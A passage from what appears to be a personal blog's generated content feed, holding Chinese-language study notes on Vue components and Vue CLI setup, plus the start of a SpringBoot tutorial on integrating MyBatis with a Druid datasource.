class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="46-一个重要的内置关系"><a href="#46-一个重要的内置关系" class="headerlink" title="46.一个重要的内置关系"></a>46.一个重要的内置关系</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>一个重要的内置关系<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype；</span></span><br><span class="line"><span class="comment">        2.为什么要有这个关系:让组件实例对象VC可以访问到Vue原型上的属性、方法；</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line">    Vue.prototype.x = 99</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> school = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;MySchool&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showX&quot;</span>&gt;</span>点我提示x<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showX</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="built_in">this</span>.x)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 创建一个vm实例对象</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line">        components:&#123;</span><br><span class="line">            school</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(school.prototype.__proto__ === Vue.prototype);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 定义一个构造函数</span></span></span><br><span class="line">    /*function Demo(params) &#123;</span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.a = <span class="number">1</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.b = <span class="number">2</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="javascript">    <span class="comment">// 创建一个Demo实例对象</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> d = <span class="keyword">new</span> Demo()</span></span><br><span class="line">    </span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(Demo.prototype);<span class="comment">//显式原型属性</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(d.__proto__);<span class="comment">//隐式原型属性</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(Demo.prototype === d.__proto__);</span></span><br><span class="line">     </span><br><span class="line"><span class="javascript">    <span class="comment">//程序员通过显式原型属性操作原型对象，追加一个x属性，值为99.</span></span></span><br><span class="line">    Demo.prototype.x = 99</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// console.log(&#x27;@&#x27;,d.__proto__.x);</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">&#x27;@&#x27;</span>,d);*/</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="47-单文件组件"><a href="#47-单文件组件" class="headerlink" title="47.单文件组件"></a>47.单文件组件</h2><h3 id="47-1-创建一个School组件"><a href="#47-1-创建一个School组件" class="headerlink" title="47.1 创建一个School组件"></a>47.1 创建一个School组件</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 组件的结构 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：&#123;&#123;schoolName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">//组件交互相关的代码（数据、方法等等）</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//export default Vue.extend(&#123;&#125;)可以简写为：export default &#123;&#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;School&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="comment">/* 组件的样式 */</span></span></span><br><span class="line">    .demo&#123;</span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: orange;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="47-2-创建一个Student组件"><a href="#47-2-创建一个Student组件" class="headerlink" title="47.2 创建一个Student组件"></a>47.2 创建一个Student组件</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 组件的结构 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生名字：&#123;&#123;studentName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">//组件交互相关的代码（数据、方法等等）</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//export default Vue.extend(&#123;&#125;)可以简写为：export default &#123;&#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;Student&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                studentName:<span class="string">&#x27;Tom&#x27;</span>,</span></span><br><span class="line">                age:22</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="47-3-创建一个App组件"><a href="#47-3-创建一个App组件" class="headerlink" title="47.3 创建一个App组件"></a>47.3 创建一个App组件</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 必须有div根元素 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">School</span>&gt;</span><span class="tag">&lt;/<span class="name">School</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Student</span>&gt;</span><span class="tag">&lt;/<span class="name">Student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 引入组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> School  <span class="keyword">from</span> <span class="string">&#x27;./School.vue&#x27;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> Student  <span class="keyword">from</span> <span class="string">&#x27;./Student.vue&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">        components:&#123;</span><br><span class="line">            School,</span><br><span class="line">            Student</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="47-4-创建一个main-js入口文件"><a href="#47-4-创建一个main-js入口文件" class="headerlink" title="47.4 创建一个main.js入口文件"></a>47.4 创建一个main.js入口文件</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    template:<span class="string">&#x27;&lt;App&gt;&lt;/App&gt;&#x27;</span>,</span><br><span class="line">    components:&#123;App&#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="47-5-创建一个容器"><a href="#47-5-创建一个容器" class="headerlink" title="47.5 创建一个容器"></a>47.5 创建一个容器</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试一下单文件组件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 准备一个容器 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;App&gt;&lt;/App&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="48-创建Vue脚手架"><a href="#48-创建Vue脚手架" class="headerlink" title="48.创建Vue脚手架"></a>48.创建Vue脚手架</h2><h3 id="48-1-说明"><a href="#48-1-说明" class="headerlink" title="48.1 说明"></a>48.1 说明</h3><p>1.Vue脚手架是Vue官方提供的标准化开发工具（开发平台）。</p><p>2.最新版本是4.x。</p><p>3.文档：<a href="https://cli.vuejs.org/zh/。">https://cli.vuejs.org/zh/。</a></p><h3 id="48-2-具体步骤"><a href="#48-2-具体步骤" class="headerlink" title="48.2 具体步骤"></a>48.2 具体步骤</h3><p><strong>第一步（仅第一次执行）：</strong>全局安装@vue/cli。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g @vue/cli</span><br></pre></td></tr></table></figure><p><strong>第二步：</strong><font color="red"><strong>切换到你要创建项目的目录</strong></font>，然后使用命令创建项目。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vue create xxxx</span><br></pre></td></tr></table></figure><p><strong>第三步：</strong>启动项目。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm run serve</span><br></pre></td></tr></table></figure><p><strong>备注：</strong></p><ol><li><p>如果出现下载缓慢请配置npm淘宝镜像：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></li><li><p>Vue 脚手架隐藏了所有webpack相关的配置，若想查看具体的webpack相关配置，请执行：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vue inspect &gt; output.js</span><br></pre></td></tr></table></figure></li></ol><h2 id="49-Vue脚手架项目的学习"><a href="#49-Vue脚手架项目的学习" class="headerlink" title="49.Vue脚手架项目的学习"></a>49.Vue脚手架项目的学习</h2><div class="tip warning"><p>由于使用了Vue脚手架，不方便直接贴源码展示，请移至项目仓库查看！（可以clone源码运行，方便查看效果）</p></div><span class='p left red h4'>GitHub存储库地址：</span><div class="table-container"><table><thead><tr><th style="text-align:center">Vue语法学习</th><th style="text-align:center">Vue脚手架学习</th></tr></thead><tbody><tr><td style="text-align:center"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/QianChengGit/StudyVueLog"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=QianChengGit&repo=StudyVueLog&theme=vue&show_owner=true"/></a></td><td style="text-align:center"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/QianChengGit/vue_test"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=QianChengGit&repo=vue_test&theme=vue&show_owner=true"/></a></td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> Vue学习日志 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springBoot学习日志</title>
      <link href="2021/05/10/springBoot%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
      <url>2021/05/10/springBoot%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h1 id="springBoot学习日志"><a href="#springBoot学习日志" class="headerlink" title="springBoot学习日志"></a>springBoot学习日志</h1><h2 id="1-学习视频"><a href="#1-学习视频" class="headerlink" title="1.学习视频"></a>1.学习视频</h2><div class="tag link"><a class="link-card" title="springBoot学习视频" href="https://www.bilibili.com/video/BV17z4y1X7is"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">springBoot学习视频</p><p class="url">https://www.bilibili.com/video/BV17z4y1X7is</p></div></a></div><h2 id="2-GitHub仓库"><a href="#2-GitHub仓库" class="headerlink" title="2.GitHub仓库"></a>2.GitHub仓库</h2><div class="table-container"><table><thead><tr><th style="text-align:center">GitHub仓库</th></tr></thead><tbody><tr><td style="text-align:center"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/QianChengGit/tx_sboot"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=QianChengGit&repo=tx_sboot&theme=vue&show_owner=true"/></a></td></tr></tbody></table></div><h2 id="3-springBoot知识点"><a href="#3-springBoot知识点" class="headerlink" title="3.springBoot知识点"></a>3.springBoot知识点</h2><p>待写……</p>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
          <category> SpringBoot学习日志 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> springBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot整合MyBatis（注解方式）</title>
      <link href="2021/05/09/springboot%E6%95%B4%E5%90%88Mybatis%EF%BC%88%E6%B3%A8%E8%A7%A3%E6%96%B9%E5%BC%8F%EF%BC%89/"/>
      <url>2021/05/09/springboot%E6%95%B4%E5%90%88Mybatis%EF%BC%88%E6%B3%A8%E8%A7%A3%E6%96%B9%E5%BC%8F%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="springboot整合MyBatis（注解方式）"><a href="#springboot整合MyBatis（注解方式）" class="headerlink" title="springboot整合MyBatis（注解方式）"></a>springboot整合MyBatis（注解方式）</h1><hr><ul><li><p>在pom.xml文件中导入MyBatis所需依赖：</p>  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- jdbc的starter，如果使用mybatis-spring-boot-starter就不需要这个starter,因为mybatis的starter自带jdbc的starter --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- MyBatis的starter --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--引入mysql驱动--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- druid连接池依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.22<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- log4j日志依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>在application.yaml文件中配置数据源和MyBatis：</p>  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#数据源的配置</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/ssm?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="attr">initialSize:</span> <span class="number">5</span></span><br><span class="line">    <span class="attr">minIdle:</span> <span class="number">5</span></span><br><span class="line">    <span class="attr">maxActive:</span> <span class="number">20</span></span><br><span class="line">    <span class="attr">maxWait:</span> <span class="number">60000</span></span><br><span class="line">    <span class="attr">timeBetweenEvictionRunsMillis:</span> <span class="number">60000</span></span><br><span class="line">    <span class="attr">minEvictableIdleTimeMillis:</span> <span class="number">300000</span></span><br><span class="line">    <span class="attr">validationQuery:</span> <span class="string">SELECT</span> <span class="number">1</span> <span class="string">FROM</span> <span class="string">DUAL</span></span><br><span class="line">    <span class="attr">testWhileIdle:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">testOnBorrow:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">testOnReturn:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">poolPreparedStatements:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filters:</span> <span class="string">stat,wall,log4j</span></span><br><span class="line">    <span class="attr">maxPoolPreparedStatementPerConnectionSize:</span> <span class="number">20</span></span><br><span class="line">    <span class="attr">useGlobalDataSourceStat:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">connectionProperties:</span> <span class="string">druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建DataSourceConfig配置类：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.datasource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataSourceConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//配置第三方组件（Druid连接池的数据源配置）</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConfigurationProperties(prefix = &quot;spring.datasource&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DruidDataSource <span class="title">dataSource</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DruidDataSource();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建User实体类（实体类的属性要与数据表中字段名相同，数据库表的内容就不贴出来了）：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.datasource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="keyword">private</span> String imageSrc;</span><br><span class="line">    <span class="keyword">private</span> String manager;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line"> 